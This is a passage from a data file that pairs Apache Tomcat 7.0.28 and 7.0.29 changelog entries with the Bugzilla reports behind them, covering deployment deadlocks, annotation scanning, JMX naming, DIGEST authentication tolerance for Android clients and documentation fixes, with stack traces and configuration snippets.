Catalina|Tomcat 7.0.29 (markt)|add|52135|Add support for a default error page to be defined in web.xml by defining an error page with just a nested location element. It appears this feature was intended to be included in the Servlet 3.0 specification but was accidently left out. (markt)|Global error page is not handled|"The new Servlet 3.0 global error page

    <error-page>
        <location>/error.jsp</location>
    </error-page>

is not handled in Tomcat 7.

On Glassfish 3 for example, it works fine."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52135
Catalina|Tomcat 7.0.29 (markt)|fix|53450|Correct regression in fix for 52999 that could easily trigger a deadlock when deploying a ROOT web application. (markt)|Deployment of an application with 'ROOT' context hangs forever|"Hi,

The scenario is the following:
- I have running Tomcat 7.0.28
- I deploy an application with 'ROOT' context
- The deployment hangs forever. When taking a tread dump, the following is suspicious:

""localhost-startStop-2"" daemon prio=6 tid=0x0000000006607800 nid=0x2560 waiting on condition [0x0000000009ebf000]
   java.lang.Thread.State: WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x00000007d80f0108> (a java.util.concurrent.locks.ReentrantReadWriteLock$NonfairSync)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:158)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:842)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178)
        at java.util.concurrent.locks.ReentrantReadWriteLock$WriteLock.lock(ReentrantReadWriteLock.java:807)
        at org.apache.catalina.core.ContainerBase.removeContainerListener(ContainerBase.java:1071)
        at org.apache.catalina.core.StandardEngine$AccessLogListener.uninstall(StandardEngine.java:463)
        at org.apache.catalina.core.StandardEngine$AccessLogListener.containerEvent(StandardEngine.java:505)
        at org.apache.catalina.core.ContainerBase.fireContainerEvent(ContainerBase.java:1431)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:907)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:875)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:618)
        at org.apache.catalina.startup.HostConfig.deployDirectory(HostConfig.java:1100)
        at org.apache.catalina.startup.HostConfig$DeployDirectory.run(HostConfig.java:1618)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:441)
        at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303)
        at java.util.concurrent.FutureTask.run(FutureTask.java:138)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)



As you can see
- A read lock is acquired at org.apache.catalina.core.ContainerBase.fireContainerEvent(ContainerBase.java:1425)
- Then every listener is invoked to process the container event
- Then AccessLogListener is invoked org.apache.catalina.core.StandardEngine$AccessLogListener.uninstall(StandardEngine.java:463)
- The latter causes a call for a write lock org.apache.catalina.core.ContainerBase.removeContainerListener(ContainerBase.java:1071)
- Unfortunately in the ReentrantReadWriteLock it is stated that upgrade from read to write lock is not possible
""Reentrancy also allows downgrading from the write lock to a read lock, by acquiring the write lock, then the read lock and then releasing the write lock. However, upgrading from a read lock to the write lock is not possible.""

Regards
Violeta Georgieva"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53450
Catalina|Tomcat 7.0.29 (markt)|fix||As per section 1.6.2 of the Servlet 3.0 specification and clarification from the Servlet Expert Group, the servlet specification version declared in web.xml no longer controls if Tomcat scans for annotations. Annotation scanning is now always performed - regardless of the version declared in web.xml - unless metadata complete is set to true. (markt)|||
Catalina|Tomcat 7.0.29 (markt)|fix|53619|As per clarification from the Servlet Expert Group, JARs will always be scanned for ServletContainerInitializers regardless of the setting of metadata complete. However, if an absolute ordering is specified and a JAR is excluded from that ordering it will not be scanned for ServletContainerInitializers nor will it be scanned for matches to any HandleTypes annotations. (markt)|If <absolute-ordering> is defined, only fragments mentioned in it shall get class-scanned|"There was a discussion at the dev list how one could prevent his app from scanning all the classpath if a ServletContextInitializer is found:

http://tomcat.10.n6.nabble.com/tomcat-7-0-29-startup-time-td4984446.html

Mark pointed me at a current EG discussion: 
http://java.net/jira/browse/SERVLET_SPEC-36

The agreed status seems to be that _if_ an <absolute-ordering> element exists in WEB-INF/web.xml, then only the web-fragments mentioned therein shall be scanned. This is especially true if the <absolute-ordering> contains no <others/> element.

An empty <absolute-ordering/> shall therefore disable scanning at all as far as I understood.

This seems already be reflected in servlet-3.0 section 8.2.2 ""Ordering of web.xml and web-fragment.xml"" paragraph 1.d:
""If a discovered ServletContainerInitializer is loaded from an excluded jar, it will be ignored. Excluded jars are not scanned for classes to be handled by any ServletContainerInitializer.""


What I do not yet completely understand is that servlet-3.0 section 8.2.1 ""Modularity of web.xml"" explicitly defines as general rule:

""As before, if the metadata-complete element is set to true in the web.xml descriptor, annotations in the class files and web-fragments bundled in jars will not be processed.""

This not only contradicts the 'clarification' of the EG regarding the ServletContextInitializer which is in question here, but also could be interpreted as : ""if metadata-complete is true, then no web-fragment handling is done. Thus also no <absolute-ordering> will be evaluated"".
Not that I would like this, I just like to have this clarified upfront (before we have to throw away some work afterwards).

Did I miss something in this regard?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53619
Catalina|Tomcat 7.0.29 (markt)|add|53465|Populate mapped-name property for resources defined in web.xml. Based on a patch by Violeta Georgieva. (markt)|mapped-name is read when in @Resource, but not when in web.xml|"Created attachment 28995 [details]
Patch proposal

Hi,

When I have the code below in a servlet

	@Resource(mappedName=""test"")
	private DataSource ds;

'mapped name' is read when @Resource is processed (org.apache.catalina.startup.WebAnnotationSet.addResource(WebAnnotationSet.java:377)) so later on it is available through Reference object as StringRefAddr


But when I have the declaration below in web.xml

  <resource-ref>
  	<res-ref-name>datasource</res-ref-name>
  	<res-type>javax.sql.DataSource</res-type>
  	<mapped-name>test</mapped-name>
  </resource-ref>

'mapped name' is not read at all.

I would like to propose a patch that adds additional Rule to WebRuleSet so that 'mapped name' is process and set as property.

I'm looking forward to your comments.

Regards
Violeta Georgieva"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53465
Catalina|Tomcat 7.0.29 (markt)|add||Make the request available when establishing a WebSocket connection. (markt)|||
Catalina|Tomcat 7.0.29 (markt)|fix|53467|Correct a regression in the fix for 53257 that introduced problems for JSPs that used characters that must be encoded if used in a URI. (markt)|7.0.28 will no longer accept our jsp filenames|"We are currently running Tomcat7 7.0.27, and attempting to upgrade to 7.0.28.

Some of our jsp files have square brackets and commas in the filenames, ie:

WEB-INF/templates/com.example.standard/Container.asHeaderItem[_,_,closings].jsp

With 7.0.27, this works fine. With 7.0.28, an error is thrown to the 'localhost.<date>.log' file, IE:



Jun 25, 2012 4:17:42 PM org.apache.catalina.core.ApplicationContext log
SEVERE: Failed to locate resource [/WEB-INF/templates//com.example.standard/CMContainer.asHeaderItem[_,_,closings].jsp] in context [/cae]
java.net.URISyntaxException: Illegal character in path at index 123: jndi:/localhost/cae/WEB-INF/templates/com.example.standard/Container.asHeaderItem[_,_,closings].jsp
        at java.net.URI$Parser.fail(URI.java:2810)
        at java.net.URI$Parser.checkChars(URI.java:2983)
        at java.net.URI$Parser.parseHierarchical(URI.java:3067)
        at java.net.URI$Parser.parse(URI.java:3015)
        at java.net.URI.<init>(URI.java:806)
        at org.apache.catalina.core.ApplicationContext.getResource(ApplicationContext.java:537)
        at org.apache.catalina.core.ApplicationContextFacade.getResource(ApplicationContextFacade.java:201)
        at org.springframework.web.context.support.ServletContextResource.exists(ServletContextResource.java:101)


Looks like this is the change that is breaking things:
http://svn.apache.org/viewvc/tomcat/trunk/java/org/apache/catalina/core/ApplicationContext.java?r1=1344890&r2=1345357&pathrev=1345357

Was this intentional? Or is our naming actually OK and this is a new bug?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53467
Coyote|Tomcat 7.0.29 (markt)|fix|53430|Avoid a JVM crash when a connector that requires the APR/native library is explicitly specified and the library, or a recent enough version of it, is not available. (markt)|JVM crash at startup if TC-Native version is too old|"For each Tomcat release there exists minimum version of Tomcat-Native library with which it can work.

Tomcat 7.0.28 requires Tomcat-Native 1.1.24 or later.

If you try to start it with an older version of the library + it is explicitly configured it to use the ""Apr"" variant of a connector,
then it crashes the JVM at startup.

Actual result:
Tomcat will not start and will crash the JVM.
A crash report file is created by JVM (hs_err_pidNNNN.log)

Stack trace from the crash report file:
[[[
Stack: [0x008c0000,0x00910000],  sp=0x0090f634,  free space=317k
Native frames: (J=compiled Java code, j=interpreted, Vv=VM code, C=native code)
C  [tcnative-1.dll+0xf762]
C  [tcnative-1.dll+0x6ddd]  Java_org_apache_tomcat_jni_Pool_create+0x1d
j  org.apache.tomcat.jni.Pool.create(J)J+0
j  org.apache.tomcat.util.net.AprEndpoint.bind()V+2
j  org.apache.tomcat.util.net.AbstractEndpoint.init()V+8
j  org.apache.coyote.AbstractProtocol.init()V+274
j  org.apache.catalina.connector.Connector.initInternal()V+49
j  org.apache.catalina.util.LifecycleBase.init()V+29
j  org.apache.catalina.core.StandardService.initInternal()V+105
j  org.apache.catalina.util.LifecycleBase.init()V+29
j  org.apache.catalina.core.StandardServer.initInternal()V+212
j  org.apache.catalina.util.LifecycleBase.init()V+29
j  org.apache.catalina.startup.Catalina.load()V+573
j  org.apache.catalina.startup.Catalina.load([Ljava/lang/String;)V+9
]]]

Expected result:
1. Log an error and do not initialize the connector. Do not initialize the endpoint.

If org.apache.catalina.startup.EXIT_ON_INIT_FAILURE=true system property is configured [1], then exit Tomcat.
If the property is not defined or is false (its current default value), then continue with startup sequence, without that connector.


[1] http://tomcat.apache.org/tomcat-7.0-doc/config/systemprops.html

---------------------
Steps to reproduce: (on Windows)
1. Place an older version of tcnative-1.dll (e.g. the one from Tomcat 7.0.27) into the bin directory.
2. Configure connector with one of these:
protocol=""org.apache.coyote.http11.Http11AprProtocol""
protocol=""org.apache.coyote.ajp.AjpAprProtocol""
3. Start Tomcat
Actual result: JVM crashes, as described above.

---------------------
Notes on the code:
1. The issue is that AprLifecycleListener.isAprAvailable() flag is only tested by Connector#setProtocol(String) and influences autoselection of protocols.

If an Apr protocol implementation is configured explicitly, it does not prevent it from starting.

2. The code is essentially the same in 6.0 and 5.5. So it is an old issue.

This issue happens when running the testsuite because the testsuite explicitly selects the Apr connector.

3. If tc-native version is below required one, AprLifecycleListener shuts down the library by calling terminateAPR().

That is why an old library crashes early.

4. AprEndpoint is not supposed to call AprLifecycleListener.isAprAvailable() directly, because they belong to different subsystems (coyote, tomcat.util.net vs. catalina.core).  Do we care?

We can do the isAprAvailable() check in Connector class, but it would mean that Connector class should know which ProtocolHandler implementations require the library. It could guess it from ProtocolHandler class name (contains(""Apr"")), but it is not pretty.

---------------------
Thread on dev@:
""tcnative version check broken for test suite of TC 7"" (2012-06-16)
http://tomcat.markmail.org/thread/izbqzmfgs7jdgnnq"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53430
Jasper|Tomcat 7.0.29 (markt)|fix|53421|Provide a more helpful error message if a getter or setter cannot be found for a bean property when using expression language. (markt)|BeanELResolver's inner class BeanProperty throws incorrect message while PropertyNotFound|"BeanELResolver's inner class BeanProperty(line: 264) has two methods (write, read) that will throw PropertyNotFoundException. And there current implementation are wrong:

  throw new PropertyNotFoundException(message(ctx,
                            ""propertyNotWritable"", new Object[] {
                                    type.getName(), descriptor.getName() }));

it should use owner.getName() instead of type.getName() because the assembled message will be:

Property '[descriptor.getName()]' not readable on type [type.getName()]

Here the descriptor.getName() means the property name, type.getName() means the property type's name and the owner.getName() means the property owner - bean's type name.

Of course we developer would prefer to receive a message that tells us which bean type doesn't contain such property because this is a PropertyNotFoundException."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53421
Jasper|Tomcat 7.0.29 (markt)|fix|53460|Allow container to handle errors if the creation of the PageContext fails rather than swallowing the error. (markt)|Use error handling when TooManyActiveSessionsException happens in JSP|"I noticed this while testing the fix for bug 53230 in Tomcat 6.

To reproduce:
1. Limit the count of active sessions supported by session manager, by adding the following line to conf/server.xml:

<Manager maxActiveSessions=""0"" />

2. Start Tomcat and access the NumGuess example:

http://localhost:8080/examples/jsp/num/numguess.jsp


Actual result:
- Blank page.
- An error (SEVERE) is logged by JspFactoryImpl.internalGetPageContext(),
where this exception is swallowed.

Expected result:
- Error page.
- This expected issue does not deserve severe logging.

Note, that simply rethrowing it in JspFactoryImpl.internalGetPageContext() will not help, as will be further swallowed by Java code of JSP page and proper error handling there does not happen without a PageContext instance - see r1347100 for related fix.

Maybe create PageContext instance and initialize session in two separate calls? So that if session initialization fails, it could be handled by that PageContext instance.


Stack trace:
(trunk, running with SecurityManager enabled)
[[[
23-Jun-2012 17:28:20.937 SEVERE [http-apr-8080-exec-2] org.apache.jasper.runtime.JspFactoryImpl.internalGetPageContext Exception initializing page context
 org.apache.catalina.session.TooManyActiveSessionsException: createSession: Too many active sessions
	at org.apache.catalina.session.ManagerBase.createSession(ManagerBase.java:616)
	at org.apache.catalina.connector.Request.doGetSession(Request.java:2687)
	at org.apache.catalina.connector.Request.getSession(Request.java:2119)
	at org.apache.catalina.connector.RequestFacade$GetSessionPrivilegedAction.run(RequestFacade.java:217)
	at org.apache.catalina.connector.RequestFacade$GetSessionPrivilegedAction.run(RequestFacade.java:206)
	at java.security.AccessController.doPrivileged(Native Method)
	at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:895)
	at org.apache.catalina.connector.RequestFacade.getSession(RequestFacade.java:910)
	at org.apache.jasper.runtime.PageContextImpl._initialize(PageContextImpl.java:146)
	at org.apache.jasper.runtime.PageContextImpl.initialize(PageContextImpl.java:125)
	at org.apache.jasper.runtime.JspFactoryImpl.internalGetPageContext(JspFactoryImpl.java:112)
	at org.apache.jasper.runtime.JspFactoryImpl.access$000(JspFactoryImpl.java:41)
	at org.apache.jasper.runtime.JspFactoryImpl$PrivilegedGetPageContext.run(JspFactoryImpl.java:156)
	at org.apache.jasper.runtime.JspFactoryImpl$PrivilegedGetPageContext.run(JspFactoryImpl.java:129)
	at java.security.AccessController.doPrivileged(Native Method)
	at org.apache.jasper.runtime.JspFactoryImpl.getPageContext(JspFactoryImpl.java:63)
	at org.apache.jsp.jsp.num.numguess_jsp._jspService(numguess_jsp.java:54)

]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53460
Web applications|Tomcat 7.0.29 (markt)|fix||Update the WebSocket examples in the examples web application so that they work with secure connections (wss) as well as non-secure (ws) connections. (markt)|||
Web applications|Tomcat 7.0.29 (markt)|fix|53456|Minor corrections and improvements to the HTTP connector configuration reference. Patch provided by sebb. (markt)|Minor tweaks to config/http.html|"Created attachment 28986 [details]
Patch to fix doc as per description

The attached patch makes some minor changes to the http.html page.

This page is now quite long, and it can be hard distinguishing between the attributes that apply to BIO-NIO compared with APR/Native, so I added subsection headers around the attributes.

I also moved the reference to the SSL Howto to the beginning, because it applies to both.

Also made a couple of other minor edits. 

e.g. in the table at the bottom:

Java Nio Blocking Connector => Java Non Blocking Connector

It builds OK for me in WinXP."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53456
Web applications|Tomcat 7.0.29 (markt)|fix|53459|Correction and clarifications to the SSL Connector configuration examples in the SSL how-to. (markt)|"clientAuth=""optional"" not documented - is it valid?"|"The file ssl-howto.xml includes the line

  clientAuth=""optional"" SSLProtocol=""TLSv1""/&gt;

However, the corresponding description of the clientAuth parameter in config/http.xml does not mention ""optional"" as a possible parameter value, only ""true"", ""false"", ""want"".

The code in util.net.jsse.JSSESocketFactory only checks for

""true"", ""yes"" and ""want""; AFAICT everthing else is treated as ""false"".

It looks like the entry in ssl-howto.xml is wrong.

Also, perhaps the description in http.xml should include ""yes"" as an alias for ""true""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53459
Web applications|Tomcat 7.0.29 (markt)|fix|53464|Correct reference to sample init.d script for use with jsvc in the documentation web application. (markt)|Tomcat installation instructions reference init.d file that does not exist / document init.d|"On this page

http://tomcat.apache.org/tomcat-7.0-doc/setup.html

We have

""The file $CATALINA_HOME/bin/commons-daemon-1.0.x-native-src/unix/native/Tomcat5.sh can be used as a template for starting Tomcat automatically at boot time from /etc/init.d. The file is currently setup for running Tomcat 5.5.x, so it will be necessary to edit it a little.""

There is no file Tomcat5.sh in bin/commons-daemon-1.0.10-native-src/unix/native/ or anywhere else in the Tomcat 7.0.x installation that I can see. /"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53464
Web applications|Tomcat 7.0.29 (markt)|fix|53473|Correct the allowed values for the SSI option isVirtualWebappRelative which are true or false. (markt)|Error in isVirtualWebappRelative param configuration|"The docs for the 'isVirtualWebappRelative' param configuration state that '0' or '1' is the accepted setting:

web.xml and ssi-howto:
<!--   isVirtualWebappRelative                                            -->
<!--                       Should ""virtual"" paths be interpreted as       -->
<!--                       relative to the context root, instead of       -->
<!--                       the server root?  (0=false, 1=true) [0]        -->

but the code that reads the parameter is:

org/apache/catalina/ssi/SSIServlet.java: 
isVirtualWebappRelative = Boolean.parseBoolean(config.getInitParameter(""isVirtualWebappRelative""));


org/apache/catalina/ssi/SSIFilter.java:
isVirtualWebappRelative = Boolean.parseBoolean(getServletConfig().getInitParameter(""isVirtualWebappRelative""));

As of that code, the only working configuration to set the 'isVirtualWebappRelative' to true is:

<init-param>
          <param-name>isVirtualWebappRelative</param-name>
          <param-value>true</param-value>
</init-param>

and not

<init-param>
          <param-name>isVirtualWebappRelative</param-name>
          <param-value>1</param-value>
</init-param>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53473
Web applications|Tomcat 7.0.29 (markt)|fix||Document roleNested property of JNDIRealm in Configuration Reference. (kkolinko)|||
jdbc-pool|Tomcat 7.0.29 (markt)|fix||53445 (r1354173): Allow configurable name for SlowQueryReportJmx (fhanik)|Support consistent Jmx object naming strategy across managed resources|"Tomcat JDBC Pool Versions tested: 7.0.27 & 7.0.28
More of an inquiry.  Let me preface by saying we have recently adopted this pool and are very pleased so far.

Currently, Jmx managed resources like ConnectionPool and SlowQueryReportJmx are registered under the same domain (i.e. tomcat.jdbc).  Some users may want to employ an alternate object naming strategy.  With DataSource#createObjectName it is relatively easy to change the ConnectionPool ObjectName (i.e. subclass).  However, with SlowQueryReportJmx, due to a static getObjectName method, it requires overriding additional methods which is less desirable.
It appears that ConnectionPool has a constant POOL_JMX_TYPE_PREFIX.  SlowQueryReportJmx appears to use this but DataSource does not? 

Is there any reason that the SlowQueryReportJmx#getObjectName method is static?
What about registering an object naming strategy with the pool that the various components would use, facilitating consistency?  This would mitigate the need to override just to alter the ObjectName.

Reference: Spring MBean exporters and their ObjectNamingStrategy interface.

Thanks."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53445
jdbc-pool|Tomcat 7.0.29 (markt)|fix||53416 (r1354641): Multiple pools with the same name should register under JMX (fhanik)|Two datasources with the same name in different web applications results in javax.management.InstanceAlreadyExistsException|"Deploy two different web applications onto Tomcat.

Each web application has a resource that:

* uses the Use Tomcat JDBC Connection Pool
* has an identical name to the other one

<Resource name=""jdbc/collision"" factory=""org.apache.tomcat.jdbc.pool.DataSourceFactory"" ... />

When starting the server you get a non fatal error in the logs InstanceAlreadyExistsException.  Both applications appear to still work OK

ERROR org.apache.tomcat.jdbc.pool.DataSource - Unable to register JDBC pool with JMX
javax.management.InstanceAlreadyExistsException: tomcat.jdbc:name=""jdbc/soscvuk"",context=/,type=ConnectionPool,host=localhost,class=org.apache.tomcat.jdbc.pool.
DataSource
	at com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:453) ~[na:1.6.0_32]
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.internal_addObject(DefaultMBeanServerInterceptor.java:1484) [na:1.6.0_32]
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:963) [na:1.6.0_32]
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:917) [na:1.6.0_32]
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:312) [na:1.6.0_32]
	at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:482) [na:1.6.0_32]
	at org.apache.tomcat.jdbc.pool.DataSource.registerJmx(DataSource.java:135) [tomcat-jdbc.jar:na]
	at org.apache.tomcat.jdbc.pool.DataSource.preRegister(DataSource.java:102) [tomcat-jdbc.jar:na]
	at org.apache.tomcat.util.modeler.BaseModelMBean.preRegister(BaseModelMBean.java:1132) [tomcat-coyote.jar:7.0.27]
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.preRegisterInvoke(DefaultMBeanServerInterceptor.java:1010) [na:1.6.0_32]
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:938) [na:1.6.0_32]
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:917) [na:1.6.0_32]
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:312) [na:1.6.0_32]
	at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:482) [na:1.6.0_32]
	at org.apache.tomcat.util.modeler.Registry.registerComponent(Registry.java:742) [tomcat-coyote.jar:7.0.27]
	at org.apache.catalina.core.NamingContextListener.addResource(NamingContextListener.java:1062) [catalina.jar:7.0.27]
	at org.apache.catalina.core.NamingContextListener.createNamingContext(NamingContextListener.java:671) [catalina.jar:7.0.27]
	at org.apache.catalina.core.NamingContextListener.lifecycleEvent(NamingContextListener.java:270) [catalina.jar:7.0.27]
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119) [catalina.jar:7.0.27]
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90) [catalina.jar:7.0.27]
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5161) [catalina.jar:7.0.27]
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150) [catalina.jar:7.0.27]
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:895) [catalina.jar:7.0.27]
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:871) [catalina.jar:7.0.27]
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:615) [catalina.jar:7.0.27]
	at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:649) [catalina.jar:7.0.27]
	at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1585) [catalina.jar:7.0.27]
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:441) [na:1.6.0_32]
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303) [na:1.6.0_32]
	at java.util.concurrent.FutureTask.run(FutureTask.java:138) [na:1.6.0_32]
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [na:1.6.0_32]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [na:1.6.0_32]
	at java.lang.Thread.run(Thread.java:662) [na:1.6.0_32]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53416
Other|Tomcat 7.0.29 (markt)|fix||Fix cleanup of temporary files in TestNamingContext test. (kkolinko)|||
Other|Tomcat 7.0.29 (markt)|fix||Remove a few files from the source distribution that are not required since they are copied / generated during the build. (markt)|||
Other|Tomcat 7.0.29 (markt)|fix||Add manifest files to the set of files for which the line-ending is changed to match the OS defaults in the source distributions. (markt)|||
Other|Tomcat 7.0.29 (markt)|code||Align Jk Ant tasks definitions between antlib.xml and catalina.tasks files, introducing jkupdate as synonym for jkstatus. The latter one is deprecated. Simplify bin/catalina-tasks.xml, replacing taskdef with typedef and adding Ant condition implementations used with JMX to jmxaccessor.tasks file. (kkolinko)|||
Other|Tomcat 7.0.29 (markt)|fix|53454|Return correct content-length header for HEAD requests when content length is greater than 2GB. (markt)|Default doHead implementation overrides 'Content-Length' header|"Created attachment 28985 [details]
Sampe app with sources

If a client extends HttpServlet and desides to override doGet() method, resulting servlet can fail to correctly handle HEAD requests.

This will happen, if client chooses to set Content-Length manually (e.g., to allow content bigger than 2Gb):

  resp.setHeader(""Content-Length"", String.valueOf(12345678900L));

and only writes actual content if it is a GET request (e.g., because it is costly operation).

In such conditions, GET request will have correct ""Content-Length"" header, but HEAD requset will have ""Content-Length"" header with value 0. 

Sample project with sources is attached"|https://bz.apache.org/bugzilla/show_bug.cgi?id=53454
Catalina|Tomcat 7.0.28 (markt)|fix|52055|An additional fix to ensure that the ChunkedInputFilter is correctly recycled. (markt)|ChunkedInputFilter is not recycled for servlet 3.0 asynchronous request|"I'm using the standard servlet 3.0 async APIs with tomcat 7.0.22. The server side code is something like the following:

        final AsyncContext asyncContext = request.startAsync();

        ... // in a processing thread
        asyncContext.getRequest().getInputStream();
        ... read the input stream
        asyncContext.complete();

The InputStream returns 0 bytes for the HTTP post with chunking. 

After debugging, I found that the ChunkedInputFilter is reused by org.apache.coyote.http11.AbstractInputBuffer. But it has never been recycled (nextRequest()?) before the reuse for another request. As a result, the endChunk flag is always true after the first request. And it always return immediately without reading more from the buffer."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52055
Catalina|Tomcat 7.0.28 (markt)|add|52954|Make DIGEST authentication tolerant of clients (mainly older Android implementations) that do not follow RFC 2617 exactly. (markt)|Allowing for broken android HTTP DIGEST support|"Android's browser has a slightly broken implementation of DIGEST support, causing it to fail authentication against Tomcat.

There are 2 issues here which if bypassed in DigestAuthenticator, allow Android devices to authenticate successfully.

1. nc (nonce-count) is 6 digits instead of 8

nonce-count      = ""nc"" ""="" nc-value
nc-value         = 8LHEX

Fail as per RFC, however:
""The nc-value is the hexadecimal
     count of the number of requests (including the current request)
     that the client has sent with the nonce value in this request.""

So Android is sending a 24 bit number instead of a 32 bit number.

Tomcat is failing auth based on (nc.length() != 8) which means the request must match the RFC, but I can't see anything saying that it's necessary to fail based on a shorter nc-value.

Additionally, if this value wrapped due to being too short (the client would have to send the same nonce 16777216 times in a single request), we'd fail it anyway because of the nc check (count <= info.getCount()).

2. uri is specified as an absolute URI, whereas browsers and examples show it as a relative URI.

However, the RFC specifies this as:
digest-uri       = ""uri"" ""="" digest-uri-value
digest-uri-value = request-uri   ; As specified by HTTP/1.1

But in RFC 2616 (HTTP/1.1):

Request-URI    = ""*"" | absoluteURI | abs_path | authority
...
""To allow for transition to absoluteURIs in all requests in future
   versions of HTTP, all HTTP/1.1 servers MUST accept the absoluteURI
   form in requests, even though HTTP/1.1 clients will only generate
   them in requests to proxies.""

So this one is a bit vague as to whether an absolute uri should cause a validation fail.

There is an issue listed here showing similar problems against Apache.
http://code.google.com/p/android/issues/detail?id=21239

---------

I've only listed this as an enhancement, as Tomcat isn't broken here, but I'm interested in opinions:

We could:
1. patch Tomcat to allow the two above situations
2. make the above allowable via a setting in the Realm
3. just continue to block digest auth for all Android devices until they fix the problem.

Best Regards,
Neale Rudd"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52954
Catalina|Tomcat 7.0.28 (markt)|update|52955|Implement custom thread factory for container start-stop thread pool. It allows to use daemon threads and give them more distinct names. (kfujino)|Add a ThreadFactory implementation to the ExecutorService used to deploy applications|"Created attachment 28488 [details]
ThreadFactory implementation for ContainerBase ExecutorService

The current implementation of the ExecutorService (in ContainerBase) uses the default thread factory, producing Threads named ""pool-1-thread-1"".

Thread properties can be customised using a thread factory, modifying the naming scheme will help users identify container threads.

Patch attached."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52955
Catalina|Tomcat 7.0.28 (markt)|fix|52999|Remove synchronization bottleneck from the firing of Container events. (markt)|Performance issue with locking in ContainerBase.fireContainerEvent()|"This was reported on dev list [1]:

> 2) org.apache.catalina.core.ContainerBase.fireContainerEvent;
> That method contains critical section:
>  synchronized (listeners) {
>        list = listeners.toArray(list);
> }
>
> Is is called pretty often with every put operation into request or
> session map. That code in tomcat looks like a candidate for
> CopyOnWriteArrayList
>

I confirm that I see fireContainerEvent() calls in many places in StandardSession.

Moreover those are two nested loops:  a loop in StandardSession over array
of context.getApplicationEventListeners(); x copying the list of container listeners inside into array in context.fireContainerEvent().

I cannot confirm reported problem with request attributes - I do not see anything in the code that would send events from that access.

Is it possible to solve it with a ReadWriteLock?
Or it would be better to have a helper class that avoids copying the array over on every access (the said copy-on-write one)?

I classify this as an enhancement request.

[1] Thread ""Two performance problems (found during myfaces testing)"" on dev list, starting on 2012-03-08,
- http://tomcat.markmail.org/thread/7bbvzmkvyvryvn44
- http://marc.info/?t=133124021200002&r=1&w=2"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52999
Catalina|Tomcat 7.0.28 (markt)|add|53008|Additional test cases for BASIC authentication and RFC2617 compliance. Patch provided by Brian Burch. (markt)|New test case for Basic Authenticator|"Created attachment 28519 [details]
patch file for test org.apache.catalina.authenticator.TestNonLoginAndBasicAuthenticator

RFC2617 states the authentication scheme is case-insensitive. A new test case has been added which confirms that tomcat already complies with the requirement.

The attached patch file passes checkstyle and all tests run successfully against the trunk."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53008
Catalina|Tomcat 7.0.28 (markt)|fix|53021|Correct WebSocket protocol version detection. (pero)|Minor bug in WebSocketServlet#headerContainsToken|"There is a minor bug in WebSocketServlet#headerContainsToken(HttpServletRequest, String, String) method. It always returns 'true'. 
